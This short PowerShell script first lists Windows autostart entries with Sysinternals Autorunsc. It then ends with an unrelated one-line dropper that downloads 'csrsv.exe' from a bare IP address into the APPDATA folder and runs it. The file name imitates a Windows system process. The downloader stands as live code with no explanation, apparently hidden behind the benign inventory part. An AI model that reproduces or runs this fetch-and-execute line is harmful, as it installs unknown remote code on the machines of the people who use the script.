

if (Test-Path "$env:SystemRoot\Autorunsc.exe") {
    & $env:SystemRoot\Autorunsc.exe /accepteula -a * -c -h -s '*' 2> $null | ConvertFrom-Csv | ForEach-Object {
        $_
    }
} else {
    Write-Error "Autorunsc.exe not found in $env:SystemRoot."
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

